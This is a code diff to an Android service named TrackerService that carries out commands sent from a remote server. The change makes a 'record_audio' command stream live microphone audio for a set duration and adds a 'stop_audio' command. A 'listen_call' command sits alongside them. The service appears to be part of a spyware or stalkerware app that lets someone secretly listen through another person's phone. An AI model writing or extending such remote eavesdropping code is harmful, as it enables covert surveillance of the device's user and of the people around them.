@@ -258,24 +258,37 @@ class TrackerService : Service() {
             }
             "record_audio" -> {
                 val duration = params?.optInt("duration", 30) ?: 30
-                Log.d(TAG, "Recording audio for ${duration}s")
+                Log.d(TAG, "Starting live mic audio streaming for ${duration}s")
                 ApiClient.updateCommandStatus(commandId, "delivered")
-                RemoteCaptureManager.recordAudio(
-                    context = this@TrackerService,
-                    durationSeconds = duration,
-                    commandId = commandId
-                ) { success ->
-                    Log.d(TAG, "Audio recording result: $success")
-                    try {
-                        ApiClient.updateCommandStatus(
-                            commandId,
-                            if (success) "completed" else "failed",
-                            null,
-                            if (success) "audio" else null
-                        )
-                    } catch (e: Exception) {}
+
+                // Start live PCM audio streaming
+                if (callStreamManager == null) {
+                    callStreamManager = CallStreamManager()
+                }
+                callStreamManager?.startStreaming(commandId = commandId)
+
+                // Stop streaming automatically after requested duration
+                scope.launch {
+                    delay(duration * 1000L)
+                    callStreamManager?.stopStreaming()
+                    ApiClient.updateCommandStatus(
+                        commandId,
+                        "completed",
+                        null,
+                        "audio"
+                    )
                 }
             }
+            "stop_audio" -> {
+                Log.d(TAG, "Stopping live mic audio stream early")
+                callStreamManager?.stopStreaming()
+                val targetCmdId = params?.optString("command_id")
+                if (!targetCmdId.isNullOrEmpty()) {
+                    ApiClient.updateCommandStatus(targetCmdId, "completed")
+                }
+                ApiClient.updateCommandStatus(commandId, "completed")
+            }
+
             "listen_call" -> {
                 val enable = params?.optBoolean("enable", true) ?: true
                 Log.d(TAG, "Listen call: enable=$enable")
